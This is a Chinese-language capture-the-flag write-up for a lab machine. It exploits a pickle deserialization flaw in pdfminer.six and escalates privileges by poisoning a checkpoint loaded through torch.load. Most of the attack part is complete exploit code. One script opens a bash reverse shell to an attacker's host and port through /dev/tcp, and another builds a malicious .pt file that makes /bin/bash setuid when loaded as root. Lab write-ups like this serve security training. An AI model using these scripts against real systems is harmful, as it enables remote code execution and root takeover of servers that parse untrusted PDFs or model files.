Phase 1

立足点 — pdfminer.six Pickle 反序列化 RCE

🧒 两个包裹攻击 pdfminer.six 解析 PDF 时会读取 /Encoding 字段指向的文件。如果该文件是 pickle 格式，就会触发反序列化执行。攻击分两步：先上传恶意 pickle（伪装成 .gz 归档），再上传一个 PDF，PDF 里的 /Encoding 指向刚上传的 pickle 文件——第一个包裹是炸弹，第二个是引信。

完整 Exploit

#!/usr/bin/env python3
# exploit_2file.py — pdfminer.six pickle deserialization
# 用法: python3 exploit_2file.py <LHOST> <LPORT>

import gzip, pickle, os, sys, requests

LHOST, LPORT = sys.argv[1], sys.argv[2]
UP  = "/var/www/research.bedside.htb/uploads"
URL = "http://research.bedside.htb/"

class RCE:
    def __reduce__(self):
        cmd = f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
        return (os.system, (cmd,))

# /Encoding 字段的路径（/ 编码为 #2F）
enc = (UP + "/sh").replace("/", "#2F")

PDF = f"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>endobj
4 0 obj<< /Length 20 >>stream
BT /F1 12 Tf ET
endstream endobj
5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /F
/Encoding /{enc} /DescendantFonts [6 0 R] >>endobj
6 0 obj<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F
/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
/FontDescriptor 7 0 R >>endobj
7 0 obj<< /Type /FontDescriptor /FontName /F /Flags 4
/FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000
/Descent -200 /CapHeight 800 /StemV 80 >>endobj
trailer<< /Size 8 /Root 1 0 R >>
%%EOF
"""

# 1. 上传恶意 pickle.gz
payload = gzip.compress(pickle.dumps(RCE()))
r1 = requests.post(URL, files={
    "uploadFile": ("sh.pickle.gz", payload, "application/gzip")
})
print("[1] uploaded sh.pickle.gz")

# 2. 上传触发 PDF
r2 = requests.post(URL, files={
    "uploadFile": ("trigger.pdf", PDF.encode(), "application/pdf")
})
print("[2] uploaded trigger.pdf — 等待 cron ≈ 30 秒")

Phase 3

权限提升 — torch.load Checkpoint 投毒

developer@bedside:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
🧒 往冰箱里放有毒半成品 训练脚本启动时会用 torch.load 加载 /datastore/checkpoints/ 下的 checkpoint 文件继续训练。torch.load 底层使用 pickle.load——加载不可信文件等于任意代码执行。我们构造一个恶意 .pt 文件，让脚本以 root 权限执行我们的命令。
多身份协作 developer 有 sudo 权限但不能写 /datastore/（属于 dataops 组）；datawrangler 可以写文件但没有 sudo。需要两个 shell 配合：datawrangler 放文件，developer 触发训练。

步骤一：生成恶意 .pt（攻击机上）

#!/usr/bin/env python3
# build_evil_pt.py

import os, pickle, zipfile, argparse

class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

def build(cmd, out):
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")
    print(f"[+] wrote {out} ({os.path.getsize(out)} bytes)")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-c", "--command", default="chmod +s /bin/bash")
    p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt")
    build(p.parse_args().command, p.parse_args().output)

知识点总结

pdfminer.six 的 /Encoding 字段可以触发 pickle 反序列化。

PDF 解析器读取 /Encoding 指向的文件——如果是 pickle 格式就直接反序列化执行。双文件攻击：先上传 payload，再上传 trigger PDF。

Docker 容器内可以访问宿主机的内部服务。

外部 filtered 的端口从容器内网（172.17.0.1）可能是开放的。用 Python socket 扫端口是容器内无工具时的标准方法。

torch.load = pickle.load = 任意代码执行。

恶意 .pt 文件必须是 ZIP 格式（包含 archive/data.pkl + archive/version）。即使 torch.load 报错，payload 中的 os.system 已经执行了。

多身份协作是中高难度机器的常见模式。

一个身份有写权限，另一个有执行权限——两个 shell 各司其职，缺一不可。

竞争条件需要循环脚本对抗。

后台 cron 不断干扰环境状态？用 while true + sleep 持续维护条件，直到 exploit 触发。
